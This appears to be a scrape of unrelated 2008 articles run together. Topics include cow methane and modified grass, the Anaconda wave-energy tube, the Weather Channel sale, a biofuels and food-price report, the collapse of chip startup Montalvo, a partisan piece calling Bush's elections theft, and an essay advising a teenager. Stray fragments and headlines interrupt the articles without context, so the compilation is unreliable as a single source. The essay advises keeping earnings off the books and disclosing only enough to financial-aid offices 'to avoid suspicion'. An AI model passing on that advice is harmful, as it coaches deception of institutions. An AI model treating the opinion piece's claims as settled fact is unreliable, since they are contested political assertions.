The Inter - governmental Panel on Climate Change ( IPCC ) calculates that methane makes up 14.3 % of humanity ’s contribution to global warming and data from the National Oceanographic and Atmospheric Administration ( NOAA ) in the US shows that atmospheric methane levels may be rising again after a 10 year period of stability .
A single dairy cow can produce between 550 - 700L of methane a day and it has been estimated that methane from cattle in the UK could account for as much as 3 % of the country ’s total greenhouse gas emissions .
Cows ’ production of methane is down to the microflora in their gut that helps them to digest their food .
As these microbes break down the grass ’ cellulose , methane is produced as a by - product , the majority of which is burped up .
advertisement
David Beever , international nutrition director of Richard Keenan UK , said : ‘ You do n’t actually hear the cows burp , but they are permanently releasing methane . ’
Gramina will use sense suppression technology to prevent the expression of the enzyme O - methyl transferase .
Suppressing this enzyme leads to an increase in the digestibility of the grass without compromising its structural properties and therefore less burps and less methane .
Gramina has already tested this modification in temperate grasses in the lab and glasshouses and is now planning field trials .
However , some scientists suggest that a cow ’s absolute methane emissions might go up .
Alistair Macrae , a lecturer in farm animal health and production at the University of Edinburgh , UK , says a diet too rich in highly digestible carbs can actually increase the amount of methane a cow belches out .
This is because gut microflora convert more of these sugars into propionic acid , which creates a more acidic environment resulting in more methane .
Ian Givens , a professor of animal science , at the University of Reading , UK , says that more digestible forage could push up a cow ’s absolute methane emissions but productivity gains would mean less methane per unit of milk .
Beever agrees and says , ‘ It could increase methane emissions but it could also increase milk yields , effectively cutting the amount of methane produce per litre of milk . ’

A device consisting of a giant rubber tube may hold the key to producing affordable electricity from the energy in sea waves .
Invented in the UK , the ' Anaconda ' is a totally innovative wave energy concept .
Its ultra -simple design means it would be cheap to manufacture and maintain , enabling it to produce clean electricity at lower cost than other types of wave energy converter .
Cost has been a key barrier to deployment of such converters to date .
Named after the snake of the same name because of its long thin shape , the Anaconda is closed at both ends and filled completely with water .
It is designed to be anchored just below the sea 's surface , with one end facing the oncoming waves .
A wave hitting the end squeezes it and causes a ' bulge wave '* to form inside the tube .
As the bulge wave runs through the tube , the initial sea wave that caused it runs along the outside of the tube at the same speed , squeezing the tube more and more and causing the bulge wave to get bigger and bigger .
The bulge wave then turns a turbine fitted at the far end of the device and the power produced is fed to shore via a cable .
Because it is made of rubber , the Anaconda is much lighter than other wave energy devices ( which are primarily made of metal ) and dispenses with the need for hydraulic rams , hinges and articulated joints .
This reduces capital and maintenance costs and scope for breakdowns .
The Anaconda is , however , still at an early stage of development .
The concept has only been proven at very small laboratory - scale , so important questions about its potential performance still need to be answered .
Funded by the Engineering and Physical Sciences Research Council ( EPSRC ) , and in collaboration with the Anaconda 's inventors and with its developer ( Checkmate SeaEnergy ) , engineers at the University of Southampton are now embarking on a programme of larger - scale laboratory experiments and novel mathematical studies designed to do just that .
Using tubes with diameters of 0.25 and 0.5 metres , the experiments will assess the Anaconda 's behaviour in regular , irregular and extreme waves .
Parameters measured will include internal pressures , changes in tube shape and the forces that mooring cables would be subjected to .
As well as providing insights into the device 's hydrodynamic behaviour , the data will form the basis of a mathematical model that can estimate exactly how much power a full - scale Anaconda would produce .
When built , each full - scale Anaconda device would be 200 metres long and 7 metres in diameter , and deployed in water depths of between 40 and 100 metres .
Initial assessments indicate that the Anaconda would be rated at a power output of 1MW ( roughly the electricity consumption of 2000 houses ) and might be able to generate power at a cost of 6 p per kWh or less .
Although around twice as much as the cost of electricity generated from traditional coal - fired power stations , this compares very favourably with generation costs for other leading wave energy concepts .
" The Anaconda could make a valuable contribution to environmental protection by encouraging the use of wave power , " says Professor John Chaplin , who is leading the EPSRC - funded project .
" A one - third scale model of the Anaconda could be built next year for sea testing and we could see the first full - size device deployed off the UK coast in around five years ' time . "
The Anaconda was invented by Francis Farley ( an experimental physicist ) and Rod Rainey ( of Atkins Oil and Gas ) .
There may be advantages in making part of the tube inelastic , but this is still under assessment .
Wave - generated electricity is carbon - free and so can help the fight against global warming .
Together with tidal energy , it is estimated that wave power could supply up to 20 % of the UK 's current electricity demand .
The two - year project ' The Hydrodynamics of a Distensible Wave Energy Converter ' is receiving EPSRC funding of just over £ 430,000 .

An investor group led by NBC Universal and two private equity firms clinched a deal for the Weather Channel on Sunday after three weeks of negotiations .
Though the parties did not disclose the price , the buyers , NBC and the private equity firms Bain Capital and the Blackstone Group , will pay just under $ 3.5 billion , people briefed on the matter said .
That is less than the $ 5 billion that the Weather Channel ’s parent , Landmark Communications , sought when it put the basic cable channel and related properties like weather .com up for sale in January .
In a sign of the weaker debt markets that have clamped down on large private equity deals , more than half of the price will be paid in equity , to be divided roughly equally among the three buyers , these people said .
Yes , Mr. Bush , Mugabe 's Government is " illegitimate " , but so is yours !
By Bill Hare
Created Jun 29 2008 - 1:50 pm
Is George Bush so far removed from reality that he fails to see how vulnerable he is when he calls the ruthless and undemocratic government of Robert Mugabe in Zimbabwe “ illegitimate ” ?
Mugabe has something in common with George Bush in that he has legitimacy problems on his own behalf and achieved “ victories ” in 2000 and 2004 amid ruthless and undemocratic practices that were aimed at African Americans .
Bush ’s own brother Jeb , as governor of Florida , teamed up with then Secretary of State Katherine Harris to create a successful scheme to disenfranchise thousands of African American voters in the Sunshine State .
As a result the vote was close enough to allow the Federalist Society to prevail with a U.S. Supreme Court majority of one to shut down a democratic recount in that crucial and deciding state and throw the election to Bush .
Four years later another secretary of state hatched a scheme with the cooperation of Bush ’s chief lieutenant Karl Rove and their minions to deprive African Americans of the right to vote in the crucial and deciding state of Ohio .
The pathetic element of the Ohio effort was that the secretary of state in question on that occasion was an African American , Ken Blackwell , who had designs on the governorship in the next election .
Thankfully there was some ultimate justice as Bible pounding right winger Blackwell received a pounding from the voters and Ted Strickland was elected governor in a huge landslide .
In Florida a measure of justice occurred when Katherine Harris was overwhelmingly embarrassed in her effort to unseat Senator Bill Nelson .
George Bush was the recipient of two presidential “ victories ” by theft .
Then again , theft is proclaimed as a virtue by the Bush - Cheney neoconservative team .
After all , what was the invasion of Iraq but gigantic theft coupled with death and destruction , a successful effort to seize the nation ’s rich oil deposits and place Halliburton , Bechtel and other New World Order favorites in position to grab the spoils accompanying power ?

Biofuels the source of world food crisis : leaked report Stephen C. Webster
Published : Thursday July 3 , 2008
Print This Email This The United States Government 's Agriculture department recently claimed that the production of biofuels , or plant - based gas for use in combustion engines , has contributed a mere 3 percent to the growing cost of food worldwide .
However , a leaked report from the World Bank , detailed in a new report by the UK's The Guardian , claims that these same fuels are at the root of nearly 75 percent of increases in world food prices .
It is believed , say the story 's sources , that the report has been complete since April 2008 , though not published so as to avoid embarrassing President George W. Bush .
" Political leaders seem intent on suppressing and ignoring the strong evidence that biofuels are a major factor in recent food price rises , " said Robert Bailey , policy adviser at Oxfam , as quoted by The Guardian .
" It is imperative that we have the full picture .
While politicians concentrate on keeping industry lobbies happy , people in poor countries cannot afford enough to eat . "
The World Bank 's report estimates that rising food costs have pushed nearly 100 million people worldwide below the poverty line .
The report also states that even massive droughts in Australia have had less of an effect on food prices than the US and Europe 's push for biofuel supplies .
Additionally , the World Bank estimates a full third of corn produced in the US is being dedicated to the production of biofuels , as well as nearly half of Europe 's vegetable oil .
However , biofuels derived from food products such as sugarcane , the report says , do not have nearly as much impact .
READ THE REST .
It is believed that hundreds of lives have been lost in crashes caused by communication problems , such as when 349 passengers died following a mid-air collision between a Saudi Arabian Airlines Boeing 747 and an Air Kazakhstan Ilyushin , because they could not understand each other .
Link of the day - I will pay you $ 25 , if you come up with a cool domain name for me .
Youth
The final profile we will consider is of “ Steve , ” who is 18 years old .
He found out about Peak Oil after one of his on - line video game buddies sent him some links to Web sites , which he found deeply shocking .
Now he is totally freaked out .
Is he about to get drafted and sent off to fight for oil in the Middle East ?
How is he going to survive in a collapsing society ?
He works a part - time job and lives with his parents , who take his fears to be the folly of youth , and assume that he will be going to college , earning a respectable degree , and entering the workforce ( while going into debt at the same time ) .
Let us suppose that Steve ’s parents are correct : there will be no economic collapse any time soon .
Steve will go off to college , earn a degree in accounting , get married , take out a mortgage on a suburban home , and have children .
Now , if Steve ’s parents are reasonably well - informed , can they believe that there is more than another forty years ’ worth of nonrenewable resources left at their current level of production , never mind the need for sustained economic growth ?
As they watch the endless parade of record - setting freak weather events , with fifty - year records being broken not every fifty years , but every one or two , can they believe that none of these , together or separately , will upset Steve ’s well - laid plans ?
Even if they feel certain that they will live out their own lives in peace , why should they want Steve to work hard to perpetuate a state of affairs that they know will not last for the duration of his lifetime ?
Is it not the tiniest bit unethical of them to try to push their son in such a risky direction ?
And is it not the tiniest bit incumbent upon them to try to propose something better ?
A Web of Lies
One of Steve ’s most severe and painful realizations , if he is lucky enough to have it , will be that he has been lied to all his life , more or less continuously , by his parents , his minders at school , and even , to some extent , his own peers .
If he does not have this realization , then he will be doomed to see all that happens to him as the result his personal failings : his weakness , lack of talent , inability to fit in , or bad luck .
Even if he does have this realization , he will find it difficult to live his life accordingly , because those who lack this realization , and deem themselves successful , will try to denigrate him as a misfit or a loser .
One part of the lie is that America is the best and getting better – land of possibility and so forth – and that he can achieve his dream , whatever it is , by being diligent , hard - working , and a team player .
Of course , his dream must be an American dream – just like everyone else ’s , and involve a house in the suburbs , a couple of cars in the driveway , a couple of kids , maybe a cat and a dog , and lots of money in retirement accounts .
The other part of the lie is that Steve can live such a life and be free .
He would be free - to make false choices .
For breakfast Steve will have … stuff from a cardboard box with commercial art on it , excellent choice , Sir , well done !
And in order to get around , he will have … a disposable vinyl - upholstered sheet metal box on four rubber wheels that burns gasoline , very wise , Sir , very wise !
By choosing a prepackaged life , Steve himself would become a prepackaged product , a social appliance designed for planned obsolescence , whose useful life will be determined by the availability of the fossil fuels on which it operates .
That these are lies is plain for all to see : with each next generation , people are being forced to work harder and to go deeper into debt to maintain this suburban , middle - class lifestyle .
About a third of them experience severe psychological problems .
Also about a third of them do not believe that they will be able to afford to retire .
The majority of them believe that they are not doing as well as their parents did .
And thus we have a three - tier generationally stratified middle - class society .
At the top , we have a whole lot of happy , prosperous , self - assured old people , living it large , not willing for a moment to admit their complicity in impoverishing their children and grandchildren .
In the middle we have a smaller number of their adult children , running themselves ragged , forced to delude themselves that everything is under control , just to keep up their spirits .
And then there are even fewer young people like Steve , just coming of age , and , one would think , justifiably angry with the hand they have been dealt .
Few of them are up to the Herculean task that has been set in front of them .
Escape Plans
This society still has plenty to offer to a young person , provided that the young person is clever enough to know how to take advantage of it .
All of this advice falls into the category of “ If everyone did this , society would fall apart . ”
Clearly , this advice is for people like Steve , and does not apply to societies , empires , or civilizations .
It has been thoroughly tested right here in the U.S. , and has a track record of successfully dodging society ’s best efforts at enslavement .
First of all , it is probably a bad idea to go straight to college .
It is best to avoid getting sucked into that pipeline , which starts around the middle of senior year and ends with post - graduate indentured servitude of one sort or another .
Apply to a couple of schools , strictly pro forma , to avoid suspicion .
Having a high school diploma is important ; the grades and test scores are somewhat important .
Demonstrated excellence at one or two things is more valuable than a good average .
Most important is learning the differences between your talents , you interests , and your expectations .
At this point in the game , gaining basic money - making skills is far more important , especially in the trades , such as landscaping , interior restoration , carpentry , house painting , floor sanding , mechanical repair work , and so on , because these are all jobs that can be done for cash .
Avoid dangerous trades , such as roofing , abatement , and , in general , anything that involves toxic chemicals or dangerous machinery .
Having some business skills is important too – knowing how to deal with bosses and customers and how to supervise people .
The best approach is to work a series of short jobs – shorter than a year , learning a trade and moving on immediately , and always be on the lookout for special , unofficial projects .
Think of regular employment as good cover , but not as the main source of income – and therefore best kept to part - time .
Always job - hunting , switching and learning new jobs , will help keep your mind sharp .
But be sure to read as well , and challenge yourself by reading difficult books – this will help you when you decide to go back to school .
Once you graduate , immediately become financially independent from your parents .
Move out , and work on developing a good roommate situation .
Go for the cheapest rent you can find by talking directly to landlords and offering to take care of security and maintenance .
Pick your roommates carefully and try to get a cohesive group together , so that you can rely on each other .
Do not accept money or other sorts of financial help from your parents .
Do everything you have to so that if and when you decide to go to school , and file financial aid forms , you are not their dependent , and they are not expected to pay your college tuition or living expenses .
If your parents require an explanation , it is that you care about them : you do not believe that their retirement will be enough to live on , and the money that would be swallowed up by tuition will help .
If you have a system worked out for living frugally and making a bit of cash , on paper you can look penniless , which is perfect , because schools will confiscate all the money that you disclose to them .
Be sure to always disclose just enough to avoid suspicion , and brush up on the laws to make sure it ’s all legal .
Higher What ?
When thinking about attending a college or a university , it is important to understand what these institutions actually are .
They are often called “ institutions of higher learning , ” but the learning is quite incidental to their two most important missions : research ( government or industrial ) and something known as “ credentialing : ” the granting of degrees .
In many ways , it is a sort of extended hazing ritual , where the aspirant is required to jump through a series of blazing hoops before being granted access to a professional realm .
An important sideline is sports , and some schools are virtual beefcake outlets , with nary a forehead in the crowd disfigured by a sentient impulse .
Excellent teaching does happen , but more or less by accident .
Professors are recruited and retained based on their publications and awards ( to lend prestige to the school ) and their ability to attract grant money .
Much of the teaching is done not by the professors themselves , but by graduate student teaching assistants , adjuncts , and various other academic minions .
The human mind learns best through repetition and through applying knowledge , but college curricula are structured so as to avoid repetition , with each course designed as a stand - alone unit .
Most of the learning takes the form of cramming for tests , and what is tested is not knowledge but short - term memory .
By the time students graduate , they have forgotten most of what they have been taught , but with perfectly honed cramming skills , ready to brute - force their way through any further superficial tests of their “ knowledge ” or “ competence , ” to join the swelling ranks of America ’s credentialed amateurs .
There is supposed to be a huge difference between the best colleges and universities and the rest .
The ones considered best are mostly private , although few state schools find themselves included among them .
What is taught is generally the same throughout , and the quality of the teaching is quite random .
The best schools are thought to offer better chances for finding good jobs after graduation , but this is debatable .
For some students , the more prestigious schools offer a certain charmed quality : no matter how much they drink and how badly they do , they can not flunk out .
An echelon of tutors is summoned to guide their every mediocre step , all the way through graduation .
These are the children of the elite , whose attendance at these institutions is more a matter of tradition than anything else .
It makes no difference whether they learn anything or not : for their breed , the pedigree counts for a lot more than the obedience training .
I have run across a few of these zombies with Ivy League diplomas , childish handwritings , speech peppered with nonsense syllables , and an attitude that never stops begging for a slap .
The Optimal School
This being the lay of the land , what is a young person like Steve to do ?
The prestige offered by the best schools would be wasted on a desolate job market , while the inevitable pile of student loans would be a millstone around his neck .
And yet there is no better place to learn than a university .
I recommend that Steve choose a school not based on reputation or prestige , but word of mouth and financial advantages .
The best school is the one that offers the best financial aid package , where he knows some people in the fields of study in which he is interested , which offers cheap off - campus living , and where he can find jobs to make money on the side .
Steve should keep his earnings off the books whenever possible , or the school will confiscate them .
The school will force him to take out some loans , so he should save enough money at the same time to cover them .
He should try to find employment right at the school , because such jobs often provide a tuition waiver .
State schools have an advantage : not only are they cheaper , but a lot of the students come from the vicinity rather than from far away .
When Steve makes some friends among them , they will help him gain entry into the local community .
Ideally , this is also an area where he will want to continue living once he is done with school , among his new friends .
Deciding to settle wherever he finds a job is not a good plan ; it is much better for him to know how to find work wherever he decides to settle .
Fields of Mud
When choosing a field of study , it is important to keep in mind that there are disciplines that will abide and remain perennially valuable , while others are fluff .
The sciences – Physics , Chemistry , Biology , Zoology , Botany , Geology – will serve you well .
Mathematics , Philosophy , Astronomy , and a foreign language or two will make you a better person .
Literature and History are invaluable , but rarely taught well ; if you cannot find a truly inspired teacher , teach yourself – by reading and writing , which are the only two activities these two disciplines require .
Then there are the pseudo - sciences : Psychology , Sociology , Political Science , and Economics .
They disguise themselves as sciences by employing experimental techniques and statistical analysis , and , in the case of Economics , a funky sort of math , but they are fluff , and are clearly marked with an expiration date .
The distinction is quite crisp : for any subject , pick up a textbook older than fifty years .
If it is a real discipline , there will be some recent discoveries and technological developments missing from it ( a few elementary particles , DNA ) but the rest will still look valid .
If it is a fake subject , a fair percentage of it will look a bit iffy , with a smattering of stark raving nonsense .
Lastly , there are the conduits to the professions : Law , Medicine , and Engineering .
They have little to do with getting an education , and everything to do with learning a trade , and , of course “ credentialing . ”
In each case , the hazing is extreme .
The legal profession is already a bit overstocked , and , law being a luxury product , it seems unlikely that these graduates will be able to pay down their copious student loans in the new economy .
Already many of them lack the option of becoming public defenders or taking on pro bono cases because of their huge financial burdens .
I have already said enough about medicine ; but if Steve wants to be a doctor , there are some medical schools around the world that graduate real doctors , rather than technocrats who practice “ defensive medicine ” and shuffle paper half their day .
After the extended sleep deprivation experiment they are put through as interns , they get to live in stately homes , fly to pharmaceutical company junkets , and play a lot of golf .
That may change .
I am partial to engineering , having put myself through its rigors .
It sometimes creates what I feel is a good sort of person – a bit stunted in some ways , strangely passionate about inanimate objects , but capable at many things and generally trustworthy .
If Steve has exhibited the telltale tendencies – such as completely dismantling and reassembling various gadgets , and making them work perfectly again afterward – and if he looks forward to four years of scribbling out formulas under intense pressure , then engineering may be for him .
Whether he will be able to earn a living by engineering is unknowable , but then engineers can usually find plenty of other things to do .
The Piece of Paper
It is often hard to tell ahead of time , but for a lot of people graduating may be quite pointless , while dropping out at an opportune moment may be quite advantageous .
I know plenty of people who never graduated ; they have been my bosses , my colleagues , and my employees .
They often have an original perspective , along with an unusual depth of knowledge .
Some of the best - educated people I have ever met have been dropouts : the self - educated poet Joseph Brodsky , for instance , who won a Nobel Prize in Literature , dropped out of grade school aged fifteen .
It is best not announce your intention to never graduate , but behave accordingly .
While others are busy checking off boxes on their little curriculum planning sheets and suffering through pointless required courses with mediocre instructors , you can find out what you want to learn and who you want to learn it from , and take your time to learn it well .
Do not rush : if you feel that you have not absorbed all the material to your satisfaction , you can always request an incomplete and repeat the entire course free of charge .
If a good project comes along , take it , take a leave of absence from school , then go back and study some more .
Keep telling everyone that you intend to go back and get your degree .
I know people in their late 40s who are still in good standing , always threatening to come back and finish their degree : people find them quite charming .
Do not worry too much about grades ; it will make very little difference what grades you received , but it will matter a lot whether you have learned what you had set out to learn .
If you are on a scholarship , then by all means maintain the average that is required of you in order to continue receiving it .
Think of the grade you get as the grade you give to the professor : if the professor is excellent , then you should try to repay her with some excellence of your own .
Earth , Revisited
The last , and possibly the most formative part of your education is for you to go and see the world beyond the borders of the U.S. Learn a language , then go and backpack through countries where you can speak it .
Spanish – properly the second national language – is about the easiest language you can learn , and it unlocks a huge world , which starts right within the borders of the U.S. , and which offers a great richness of spirit , along with a level - headed perspective on all this gringo madness that you will have to learn to escape from .
You are at an age when parts of who you are – your outlook on life , your personality , your habits and your tastes – are still forming .
There is no better way to gain a fresh perspective on the world – and on yourself – than to put yourself into an unfamiliar situation : new place , new culture , a different language .
Who knows what you will find ?
It could be a new place to live , an acquired taste for leading a nomadic existence , or it could be a new peace of mind , a sense of self - sufficiency , or a unique perspective on life .
Fact or Opinion ?
What will you do ?
No -one wants to take difficult steps , make their lives more difficult , or withstand privations of any sort , based on mere opinion ; people want facts .
What I have written here most definitely straddles the fuzzy line between opinion and fact .
I have consciously avoided quoting authorities because I want to emphasize that this line really is fuzzy , and that no authority can help you make it less so .
Some of what I wrote here may resonate with you , and so you would tend to consider it closer to fact than it really is .
Other things I wrote here you might disagree with , and consider them just my opinion .
Be that as it may ; as far as your life is concerned , it is your opinion that matters , not mine .
The line between fact and opinion is always moving , sometimes imperceptibly slowly – the way an entire country sinks further and further into debt , and sometimes very fast – the way several million people suddenly lose electricity for a few weeks .
It is like a shoreline on a map – quite factual , and fixed , except for the odd storm surge .
If you remain dry , the shoreline shift is mere opinion ; if you are forced to spend some time underwater , it is more like a fact .
When will you decide it time to move to higher ground ?
When you find yourself underwater , and have to swim there ?
And what if you move to higher ground while you are still dry , and find that it is rocky and barren ?
It is human nature to want to postpone making unpleasant decisions until the last moment , and we can do so with impunity , provided we leave enough options open for us to choose from .
Every day that we live contentedly within the status quo , we restrict our options further and further , by making ourselves increasingly dependent on more and more systems over which we have no control , and on which we can not rely .
But there are also small , conscious steps we can take that break some of these dependencies , and create new options for ourselves .
If we take enough such steps , then when the time arrives for a major , life - changing decision , we will be ready .

Duo tries to break world handshaking record
Montalvo Systems was one of the most ambitious chip startups in recent history and one of a few that dared to take on Intel in the low - power mobile processor market .
Instead , it shut down in April , unable to raise a new round of financing .
The company had raised more than $ 84 million and hired an outstanding team of engineers in the hopes of grabbing a small piece of the $ 30 billion x86 ( Intel - compatible ) microprocessor industry .
But it failed to get its chip out on time and sold its assets to Sun Microsystems for dimes on the dollar .
Understanding the company ’s rise and fall offers lessons for entrepreneurs , especially those who would launch quixotic attacks against industry giants such as Intel .
Clever design is n’t enough when it comes to getting a product out .
For all its planning , Montalvo did n’t execute and was more than a year behind schedule , said several of the key figures involved in the company ’s efforts .
The story of Montalvo also offers a peek peak into the game of chess that goes on between Silicon Valley ’s biggest companies , and it raises a fatalistic question about whether the door is closed for venture - funded chip startups wanting to take on the world ’s biggest chip maker , particularly in its flagship architecture , x86 .
That fatalism is a hard pill to swallow in optimistic Silicon Valley , where the belief in building better mousetraps rides high .
“ x86 is n’t an easy thing to do , ” said one of the key Montalvo figures .
“ There are 1,001 things that can go wrong with it . ”
The Santa Clara , Calif .
company was born in 2000 as Memory Logix in the garage of Peter Song , a microprocessor designer who , once upon a time , was an analyst for the Microprocessor Report .
One of those articles was a prescient analysis that microprocessors would have multiple cores , or processors , on a single chip .
Song had figured out a way to create a low - power processor that was compatible with Intel ’s chips .
This was at a time when Intel had n’t yet discovered its low - power religion .
In an early interview , Song expressed intrigue in the possibility that Microsoft , having launched the Intel - compatible Xbox in 2001 , might consider creating an x86 - based portable gaming device .
Intel certainly gave no thought to Song ’s company , which was working on low - power “ synthesizable ” cores .
It was not nearly as ambitious as the later incarnation of the company would become .
But another rival , Transmeta , certainly awoke the sleeping giant .
Transmeta , founded by former Sun Microsystems chip pioneer Dave Ditzel , raised hundreds of millions of dollars and managed to go public in 2000 .
Transmeta ’s plan to do a low - power chip was aimed at a chink in Intel ’s armor .
Intel ’s own pre-Transmeta chips burned hot because , in its race against competitor Advanced Micro Devices , it had poured all of its engineering into chips that could run fast .
Transmeta focused on making chips for laptops and a new category of Internet - enabled handhelds .
Intel , spurred by executives such as Pat Gelsinger , responded by placing a bigger premium on power efficiency instead of performance .
The old tactics favoring performance hit the wall in May , 2004 , when Intel canceled a chip that would have been the Pentium 5 .
Intel ’s designers in Israel came to the big company ’s rescue .
Led by Dadi Perlmutter , the Israeli team took the older Pentium III core and modified it for low - power mobile usage .
In 2003 , they launched the Pentium M , and Intel shipped it as part of a marketing campaign dubbed Centrino .
It was a runaway success and crushed Transmeta , which had run into execution problems .
Transmeta had to resort to licensing its low - power technology and suing Intel for patent - infringement .
Intel also switched to doing dual - core processors on a single chip as a compromise between power and performance .
As Transmeta struggled , Song ’s company drew attention .
Vinod Dham , ( pictured left ) a former Intel engineering manager known as the “ father of the Pentium , ” was now running NewPath Ventures ( and later NEA - IndoUS Ventures . )
During 2004 , he brought together a team that combined Song ’s small group with two other veteran x86 architects , Mike Yamamura and Greg Favor .
Both of them were behind much of the success at Intel rival NexGen , a 125 - person company that AMD bought for $ 800 million .
Peter Glaskowsky , former editor in chief of the Microprocessor Report , joined as principal system architect .
He suggested naming the company Montalvo Systems , after the Villa Montalvo arts center in Saratoga , Calif. , where Transmeta debuted .
As editor of the Microprocessor Report , Glaskowsky had a sharp wit and was always good for a quote .
And he was frequently critical of Intel .
( Glaskowsky , pictured left , is tall at 6 feet 4 inches .
I once walked through “ The Star Trek Experience ” with him at the Las Vegas Hilton during a trade show .
He wanted to take a picture with Lt. Uhura , the actress Nichelle Nichols .
I snapped the picture , but Glaskowsky was so tall that his head was n’t in the shot . )
A former Broadcom engineer , Laurent Moll , joined as the SOC architect .
Moll , Glaskowsky and Favor reported to Yamamura , who was vice president of engineering and for a time served as chief executive officer .
They all came to work every day because Montalvo was the Big Show .
If it grabbed just 1 percent of the x86 microprocessor market , that would amount to $ 300 million in sales .
Everybody stood to get rich .
The company ’s internal ambition was to grab 20 percent of the notebook chip market .
Dham had a habit of swinging for the fences .
He ’d left Intel in 1995 and joined NexGen , where he met some engineers who would become key players at Montalvo .
In 1998 , he became CEO of a networking chip company , Silicon Spice , and scored big time when he sold it to Broadcom for $ 1.2 billion in 2000 , at the height of the bubble .
It was that sale that allowed him to make the move into venture capital investing .
Dham and his venture partner , Tushar Dave , wanted to give something back to their native India .
So they decided to invest in companies that had big operations in India .
They encouraged Montalvo to set up a large engineering team in Bangalore .
This team would do the grunt work for Montalvo and in the process would create skilled engineers in India who could help the country migrate up the food chain in terms of high - tech prowess .
During 2004 , the team debated its options .
Dham wanted Montalvo to be more ambitious than some of the original engineers .
One of his ideas was to fuse a processor and a graphics chip together .
That ’s an idea that AMD is pursuing .
Some of the designers warned that the chip would become overly complicated if they did that , and the company abandoned the idea .
It could pair its processor with cheap graphics chips instead , making its own chip easier to produce .
Montalvo also considered doing a chip that was only partially compatible with the Intel chips — a chip that would simply able to run Linux , not Windows that could be useful in the server market , but not in the consumer PC space .
One of the engineers proposed doing a non-x86 cell phone chip , but that would have put Montalvo head - to - head with another giant , Texas Instruments .
That idea was quickly and universally voted down .
Montalvo ultimately decided to create a Windows - compatible , four - core chip with asymmetric cores .
It would include a couple of beefy cores to handle big jobs , but it also had a couple of smaller cores to handle easier tasks .
The smaller cores would consume less power .
Montalvo could also add some more chip functions that were normally used in the chip set , or a pair of chips that served as traffic cop inside a personal computer .
If the plan worked , Montalvo would have the fastest performance laptop chip with the lowest power consumption and the lowest cost .
The whole scheme was one way to differentiate the chip from Intel ’s product line , since at two points in its history , Intel had tried and abandoned efforts to throw a lot of different functions onto a single microprocessor .
Montalvo filed more than a hundred patent applications .
Matt Perry , former chief of Transmeta , became CEO of Montalvo in 2005 , and the company moved into the same building where Dham had his offices in Santa Clara , Calif .
It later set up headquarters next door to Transmeta , just across the street from Dham ’s offices .
Dham invested in the startup and helped recruit a lot of talent .
Money soon poured in by the tens of millions .
Hiring engineers by the hundreds became the company ’s biggest chore as it expanded in 2005 and 2006 .
In Silicon Valley , times were getting better and fewer engineers than expected joined the startup at the salary levels it could pay .
Some engineers came from Transmeta , but for legal reasons , Montalvo had to avoid directly hiring Intel and AMD people .
The team in India had to handle more mundane but still critical tasks .
At least half of the engineers had to characterize the behavior of x86 chips .
That was a painful task .
Essentially , someone had to buy a computer and run programs through it one at a time .
Then the engineers would record the differences between the input and the output .
They also had to come up with a verification suite to test all possible permutations of past applications .
Ensuring x86 compatibility would require a ton of resources .
Montalvo clearly needed more money and engineers .
Bangalore had become so hot that even Indian engineers were n’t cheap .
In 2007 , the company abandoned that idea of doing asymmetric cores .
It decided it would be better off creating a high - performance laptop microprocessor with four identical cores and no chip set functions .
This change did n’t cost a huge amount of time , but it would make a difference to investors later on .
The team now had to create a 65 - nanometer chip that could beat Intel ’s fastest laptop chips .
It would essentially be a lot like AMD ’s successful family of Opteron chips but designed for the mobile environment instead .
But a return to the symmetric architecture was dangerous .
It meant Montalvo would have to match or beat Intel ’s low - power mobile processors in performance , since there was no other differentiation .
The team grew to about 280 or so people , with maybe 40 percent of the engineers in India .
The chip fell behind schedule .
Intel , meanwhile , launched its Core 2 processors in 2006 and became extremely competitive in mobile computers .
With multiple engineering teams at its disposal , Intel was able to stagger its launch dates so that it had something big coming out every six months .
“ Our goal had become performance , performance , performance , ” said one Montalvo leader .
“ But the more we focused on that , the more dangerous it was when we fell behind schedule .
Intel would easily close the gap with us . ”
In the fall of 2007 , it was clear there would n’t be enough money to finish the chip , dubbed the M - 100 .
Montalvo started raising another round .
It needed about $ 40 million to finish its design , or tape out .
A total of $ 100 million would have helped the company get to high - volume manufacturing .
But there was no guarantee that this redesigned chip was going to be on time and competitive against Intel , which was about to launch Centrino 2 ( and still is ) .
Centrino 2 , coupled with new low - power processors coming , is likely to make Intel extremely competitive in the mobile processor market for some time to come , analysts say .
Yamamura left Montalvo in 2007 for personal reasons and then eventually returned as an advisor to Redback .
Several venture capitalists said that the risks of delay were high and the consequences expensive .
Theoretically , if the company were burning $ 3 million a month , then a one - year slip in the schedule would cost $ 36 million .
A two - year slip would be $ 72 million .
That ’s a lot of money to cough up .
And they you ’re never sure if the product would be out of date by the time of its delayed introduction .
On top of that , the company might have to spend a ton on marketing just to get the chip off the ground .
Venture capitalists had to assume the company would n’t make money until its second - generation chip .
If Montalvo succeeded with a second chip , it stood the chance of raking in billions of dollars .
Some of the technical people felt like the investors should have believed in the project more and understood that they were a year behind the most optimistic schedule , but they were really on the mark in terms of the realistic schedule , given the difficulties in hiring .
The engineers felt that they got more done with fewer people than any other microprocessor startup in history .
They felt they were nearly done with one of the top five most - sophisticated microprocessors ever created with an investment of perhaps 200 man years compared to 500 for other major chips .
Even if it had raised new funds , Montalvo would n’t be spending more than what Intel , AMD , and IBM spent on their most ambitious chip designs .
Montalvo received remarkably little coverage from the mainstream press , perhaps because it was always in stealth mode .
But there was a certain “ prove it ” mindset in the press when it came to challengers to Intel .
Maybe if they grabbed that 1 percent of the x86 market , they would be worthy of coverage .
Otherwise , who would know or care if startups like Montalvo had ever existed .
Yet Intel most assuredly was closing off all of the chinks in its armor .
After former Intel CEO Craig Barrett spent billions on communications acquisitions , Intel took its eye off the core microprocessor business and left the door open for AMD ’s Opteron in 2003 .
AMD got a second life , but it faced the wrath of Intel ’s response .
Paul Otellini took over as CEO , unloaded the communications businesses , and doubled down on the mainstay microprocessor business .
He developed a “ tick tock ” business model of continuosly introducing new chips and manufacturing processes that stood a good chance of burying AMD and Montalvo along with it .
The money people were getting jittery in the spring of 2008 .
The economy was starting to teeter .
It was looking risky .
Some of the investors actually wanted to throw $ 150 million to $ 200 million at the company .
But with the execution unclear , a key investor advised against pouring more into it .
The engineers felt like they were getting close and could finish the design in 2008 .
But CEO Perry had to start shopping Montalvo for an acquisition .
He found that even big companies did n’t have the stomach for a fight with Intel .
On March 31 , a bunch of Montalvo engineers had lunch at the local hamburger joint .
When they came back in the afternoon , they were out of work .
Montalvo laid off two thirds of its employees .
A few weeks later , the company closed its doors for good and Sun bought the assets .
For Peter Song , that was the end of an eight - year journey .
But Montalvo ’s design efforts had really been under way for just about four years .
“ Montalvo tried to do a little too much , ” said one of the key engineers .
